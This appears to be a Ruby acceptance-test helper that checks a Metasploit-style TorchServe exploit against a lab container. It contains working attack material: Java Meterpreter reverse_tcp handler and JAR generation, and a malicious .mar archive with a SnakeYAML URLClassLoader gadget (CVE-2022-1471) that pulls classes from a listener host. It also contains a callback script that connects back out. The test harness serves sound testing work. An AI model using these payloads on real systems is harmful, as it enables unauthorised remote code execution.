# frozen_string_literal: true

require_relative '../laravel/sessions'
require_relative '../torchserve_check/acceptance'
require 'fileutils'
require 'rex/zip'

# Real stock Java readiness precedes normal class-loader owner delivery.
module TorchserveSessions
  include LaravelSessions
  include TorchserveCheckTarget

  def laravel_component
    'torchserve'
  end

  def laravel_owner
    TorchserveCheckTarget::OWNER
  end

  def laravel_uid
    1000
  end

  def rc_resource_roles
    %w[target reporting_db]
  end

  def session_families
    { 'java-meterpreter' => [0, 'java/meterpreter/reverse_tcp', 'meterpreter'] }
  end

  def session_default_options
    { 'java-meterpreter' => %w[TARGET PAYLOAD] }
  end

  def session_control_name
    'TorchserveSessionControl'
  end

  def session_health_path
    '/api-description'
  end

  def session_owner_options(options)
    options.merge('SRVHOST' => '0.0.0.0', 'SRVPORT' => 4493, 'URIHOST' => @listener_host)
  end

  def file(path)
    expect(path).to match(%r{\A(?:/tmp/module-target-torchserve-[a-z0-9_-]+|/home/model-server/model-store/[A-Za-z0-9]+\.mar)\z})
    code = "import pathlib,base64,json,sys;p=pathlib.Path(sys.argv[1]);print(json.dumps({'exists':True,'uid':p.stat().st_uid,'base64':base64.b64encode(p.read_bytes()).decode()} if p.exists() else {'exists':False}))"
    output, = rc_command('proof-file', 'target', 'python', '-c', code, path)
    value = JSON.parse(output)
    (@rc[:files] ||= []) << { path: path, value: value }
    rc_save
    value
  end

  def process_state
    output, = rc_command('process-state', 'target', 'perl', '/opt/module-target-process-state.pl', LaravelSessions::CALLBACK_PORT.to_s)
    raw = JSON.parse(output)
    processes = raw.fetch('processes').map do |row|
      row.except('starttime', 'cmdline').merge('birth' => row.fetch('starttime'), 'command' => row.fetch('cmdline').strip, 'uid' => row.fetch('uid').to_s)
    end
    processes.reject! do |row|
      row.fetch('command') == session_health_command || row.values_at('uid', 'ppid', 'command') == ['0', 0, 'runc init']
    end
    { 'processes' => processes, 'connections' => raw.fetch('connections').reject { |row| row.fetch('state') == '06' } }
  end

  def idle
    super
    expect(fetch_listener_open?).to be(false)
    true
  end

  def callback_control
    server = TCPServer.new('0.0.0.0', LaravelSessions::CALLBACK_PORT)
    token = 'torchserve-' + Rex::Text.rand_text_alphanumeric(24)
    program = <<~'PYTHON'
      import json, os, socket, sys
      host = socket.gethostbyname('host.docker.internal')
      identity = dict(host=host, token=sys.argv[1], uid=os.geteuid(), pid=os.getpid(), ppid=os.getppid())
      with socket.create_connection((host, int(sys.argv[2])), timeout=8) as peer:
          peer.sendall((json.dumps(identity) + '\n').encode())
          with peer.makefile('rb') as stream:
              assert stream.readline() == ('ACK:' + sys.argv[1] + '\n').encode()
      print(json.dumps(identity))
    PYTHON
    task = Thread.new { Open3.capture3(*session_exec_argv('python', '-c', program, token, LaravelSessions::CALLBACK_PORT.to_s)) }
    task.report_on_exception = false
    raise Timeout::Error, 'No native TorchServe callback' unless IO.select([server], nil, nil, 8)

    peer = server.accept
    identity = JSON.parse(Timeout.timeout(5) { peer.gets })
    expect(identity).to include('token' => token, 'uid' => laravel_uid)
    state = process_state
    process = state.fetch('processes').find { |row| row.fetch('pid') == identity.fetch('pid') }
    expect(process).to include('uid' => '1000', 'ppid' => identity.fetch('ppid'), 'birth' => be_a(String))
    connected = state.fetch('connections').select { |row| row.fetch('state') == '01' }.map { |row| row.fetch('inode') }
    expect(connected & process.fetch('connection_inodes')).not_to be_empty
    @rc[:callback] = { identity: identity, observed: state }
    peer.puts('ACK:' + token)
    peer.close
    output, error, status = Timeout.timeout(15) { task.value }
    @rc[:callback].merge!(stdout: output, stderr: error, exit: status.exitstatus)
    expect(status.success?).to be(true), output + error
    expect(JSON.parse(output)).to eq(identity)
    @listener_host = identity.fetch('host')
    settled
  ensure
    peer&.close unless peer&.closed?
    server&.close
    task&.join(15)
    rc_save
  end

  def native_session(family, delivery: 'jar')
    _target, payload, = session_families.fetch(family)
    attempt = { family: family, delivery: delivery, owner: 'exploit/multi/handler', payload: payload }
    @rc[:attempts] << attempt
    path = "/tmp/module-target-torchserve-native-#{Process.pid}-#{family}-#{delivery}"
    log_path = path + '-output'
    expect(file(path)).to eq('exists' => false)
    console_command('back')
    console_command('use exploit/multi/handler')
    { 'PAYLOAD' => payload, 'LHOST' => @listener_host, 'LPORT' => LaravelSessions::CALLBACK_PORT, 'ReverseListenerBindAddress' => '0.0.0.0', 'ExitOnSession' => false, 'ListenerTimeout' => 60, 'SessionCommunicationTimeout' => 10, 'SessionExpirationTimeout' => 90 }.each do |key, value|
      expect(console_command("set #{key} #{value}")).not_to include('Unknown datastore option')
    end
    attempt[:handler_output] = console_command('run -j -z')
    generated = rc_json("begin;job=framework.jobs.values.find{|entry|entry.ctx.first.fullname=='exploit/multi/handler'};raise 'No handler' unless job;handler,instance=job.ctx;bytes=instance.generate_jar.pack;{payload:instance.refname,spawn:instance.datastore['Spawn'],config:instance.stager_config,jar_base64:Base64.strict_encode64(bytes)};end")
    attempt[:generated] = generated
    expect(generated.values_at('payload', 'spawn')).to eq([payload, 2])
    expect(generated.fetch('config')).to include("Spawn=2\n", "LHOST=#{@listener_host}\n", "LPORT=4492\n")
    bytes = Base64.strict_decode64(generated.fetch('jar_base64'))
    expect(bytes).to start_with("PK\x03\x04".b)
    command = session_exec_argv('sh', '-c', 'cat > "$1"; chmod 600 "$1"; sha256sum "$1"', 'native-jar', path)
    output, error, status = Open3.capture3(*command, stdin_data: bytes)
    attempt[:install] = { argv: command, stdout: output, stderr: error, exit: status.exitstatus }
    expect(status.success?).to be(true), error
    expect(output.split.first).to eq(Digest::SHA256.hexdigest(bytes))
    attempt[:physical_jar] = file(path)
    expect(attempt.fetch(:physical_jar)).to eq('exists' => true, 'uid' => 1000, 'base64' => generated.fetch('jar_base64'))
    launch = ['java', '-jar', path]
    if %w[http mar].include?(delivery)
      directory = File.join(target_runtime.fetch('artifacts'), 'stock-java-' + delivery)
      FileUtils.mkdir_p(directory)
      extract = "import io,zipfile,pathlib,sys;root=pathlib.Path(sys.argv[1]);z=zipfile.ZipFile(io.BytesIO(sys.stdin.buffer.read()));[(root/n).parent.mkdir(parents=True,exist_ok=True) or (root/n).write_bytes(z.read(n)) for n in ['metasploit/Payload.class','metasploit.dat']]"
      extracted, extract_error, extract_status = Open3.capture3('python3', '-c', extract, directory, stdin_data: bytes)
      expect(extract_status.success?).to be(true), extracted + extract_error
      if delivery == 'mar'
        File.binwrite(File.join(directory, 'MyScriptEngineFactory.class'), File.binread('data/exploits/CVE-2022-1471/MyScriptEngineFactory.class'))
        FileUtils.mkdir_p(File.join(directory, 'META-INF/services'))
        File.write(File.join(directory, 'META-INF/services/javax.script.ScriptEngineFactory'), 'MyScriptEngineFactory')
      end
      reservation = TCPServer.new('0.0.0.0', 0)
      port = reservation.local_address.ip_port
      reservation.close
      log = File.open(File.join(target_runtime.fetch('artifacts'), 'stock-java-' + delivery + '.log'), 'w')
      source_pid = Process.spawn('python3', '-u', '-m', 'http.server', port.to_s, '--bind', '0.0.0.0', '--directory', directory, out: log, err: log)
      attempt[:source] = { pid: source_pid, port: port, directory: directory }
      rc_save
      rc_poll(5) do
        socket = TCPSocket.new('127.0.0.1', port)
        socket.close
        true
      rescue Errno::ECONNREFUSED
        false
      end
      if delivery == 'http'
        jar = '/home/venv/lib/python3.9/site-packages/ts/frontend/model-server.jar'
        classes = '/tmp/module-target-torchserve-url-classes'
        rc_command('compile-url-payload', 'target', 'javac', '-cp', jar, '-d', classes, '/opt/module-target/NativeUrlPayload.java')
        launch = ['java', '-cp', jar + ':' + classes, 'NativeUrlPayload', "http://#{@listener_host}:#{port}/"]
      else
        name = 'moduletargetnative' + Process.pid.to_s
        mar = Rex::Zip::Archive.new
        mar.add_file('weights.pt', '')
        mar.add_file('native_handler.py', "def handle(data, context):\n    return data\n")
        mar.add_file('native.yml', %(!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://#{@listener_host}:#{port}/"]]]]))
        mar.add_file('MAR-INF/MANIFEST.json', JSON.generate({ 'runtime' => 'python', 'archiverVersion' => '0.8.1', 'createdOn' => Time.now.strftime('%d/%m/%Y %H:%M:%S'), 'model' => { 'modelName' => name, 'serializedFile' => 'weights.pt', 'handler' => 'native_handler.py', 'configFile' => 'native.yml', 'modelVersion' => '1.0' } }))
        archive = mar.pack
        File.binwrite(File.join(directory, name + '.mar'), archive)
        endpoint = target_endpoint('target')
        uri = URI::HTTP.build(host: endpoint.fetch('host'), port: endpoint.fetch('port'), path: '/models', query: URI.encode_www_form('url' => "http://#{@listener_host}:#{port}/#{name}.mar", 'initial_workers' => 0, 'synchronous' => true))
        client = Net::HTTP.new(uri.hostname, uri.port, nil)
        client.read_timeout = 20
        response = client.start { |connection| connection.request(Net::HTTP::Post.new(uri)) }
        native_mar_path = '/home/model-server/model-store/' + name + '.mar'
        attempt[:registration] = { code: response.code, body: response.body, path: native_mar_path, archive_base64: Base64.strict_encode64(archive), physical: file(native_mar_path) }
        rc_save
        expect(response.code).to eq('500')
        expect(JSON.parse(response.body)).to include('type' => 'ClassCastException')
        expect(attempt.fetch(:registration).fetch(:physical)).to eq('exists' => true, 'uid' => 1000, 'base64' => Base64.strict_encode64(archive))
      end
    end
    unless delivery == 'mar'
      command = session_exec_argv('sh', '-c', 'output=$1; shift; exec "$@" > "$output" 2>&1', 'native-launch', log_path, *launch, detached: true)
      output, error, status = Open3.capture3(*command)
      attempt[:launch] = { argv: command, stdout: output, stderr: error, exit: status.exitstatus }
      expect(status.success?).to be(true), error
    end
    use_session(family, attempt, 'exploit/multi/handler')
    passed = true
  ensure
    primary = $ERROR_INFO
    attempt[:failure] = { type: primary.class.name, message: primary.message } if primary
    begin
      attempt[:final_process_state] = process_state
      attempt[:process_output] = file(log_path) if log_path
      rc_command('remove-native-jar', 'target', 'rm', '-f', '--', path, log_path) if path
      cleanup_session
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      attempt[:cleanup_error] = { type: e.class.name, message: e.message }
      raise unless primary
    ensure
      if source_pid
        begin
          Process.kill('TERM', source_pid)
        rescue Errno::ESRCH
          attempt[:source_already_exited] = true
        end
        _pid, source_status = Process.waitpid2(source_pid)
        attempt[:source_status] = { exit: source_status.exitstatus, signal: source_status.termsig }
        attempt[:source_closed] = true
      end
      log&.close
      rc_command('remove-url-probe-classes', 'target', 'rm', '-rf', '--', classes) if classes
      if native_mar_path
        attempt[:native_mar_after_session] = file(native_mar_path)
        rc_command('remove-native-mar', 'target', 'rm', '-f', '--', native_mar_path)
        expect(file(native_mar_path)).to eq('exists' => false)
      end
      @rc[:calibrated] << family + '-' + delivery if passed
      rc_save
    end
  end

  def use_session(family, attempt, owner)
    if owner == laravel_owner
      attempt[:effective_selection] = rc_json('{target:active_module.target_index,payload:active_module.datastore["PAYLOAD"],spawn:active_module.datastore["Spawn"]}')
      expect(attempt.fetch(:effective_selection)).to include('target' => 0, 'payload' => 'java/meterpreter/reverse_tcp', 'spawn' => 2)
      events = rc_json('framework.instance_variable_get(:@torchserve_events)').drop(@rc.fetch(:event_cursor, 0))
      @rc[:event_cursor] = rc_json('framework.instance_variable_get(:@torchserve_events).length')
      attempt[:events] = events
      attempt[:delivered] = rc_json('framework.instance_variable_get(:@torchserve_deliveries)')
      generated = rc_json('framework.instance_variable_get(:@torchserve_archives)').drop(@rc.fetch(:archive_cursor, 0))
      @rc[:archive_cursor] = rc_json('framework.instance_variable_get(:@torchserve_archives).length')
      expect(generated.length).to eq(1)
      request = events.filter_map { |row| row['request'] }.find { |row| row['method'] == 'POST' && row['uri'] == '/models' }
      expect(request).not_to be_nil
      archive = File.basename(URI(request.fetch('vars_get').fetch('url')).path)
      archive_path = '/home/model-server/model-store/' + archive
      attempt[:owner_archive] = { path: archive_path, generated: generated.first, physical: file(archive_path) }
      expect(attempt.fetch(:owner_archive).fetch(:physical)).to eq('exists' => true, 'uid' => 1000, 'base64' => generated.first.fetch('archive_base64'))
    end
    super
    expect(rc_json('framework.sessions.keys')).to eq([])
    state = attempt.fetch(:live_state)
    process = state.fetch('processes').find { |row| row.fetch('pid') == attempt.fetch(:proof).fetch('pid') }
    expect(state.fetch('connections').length).to eq(1)
    expect(process.fetch('connection_inodes')).to include(state.fetch('connections').first.fetch('inode'))
    expect(attempt.fetch(:open_reports).select { |row| row['closed_at'].nil? }.map { |row| row.fetch('id') }).to eq([attempt.fetch(:metadata).fetch('db_id')])
    attempt[:single_session_socket_and_report] = true
  ensure
    if archive_path
      # A failed model registration is not removed by DELETE. Preserve the
      # physical observation before explicit, narrowly scoped fixture recovery.
      attempt[:archive_after_session] = file(archive_path)
      rc_command('fixture-remove-owner-archive', 'target', 'rm', '-f', '--', archive_path)
      expect(file(archive_path)).to eq('exists' => false)
    end
    rc_save
  end
end
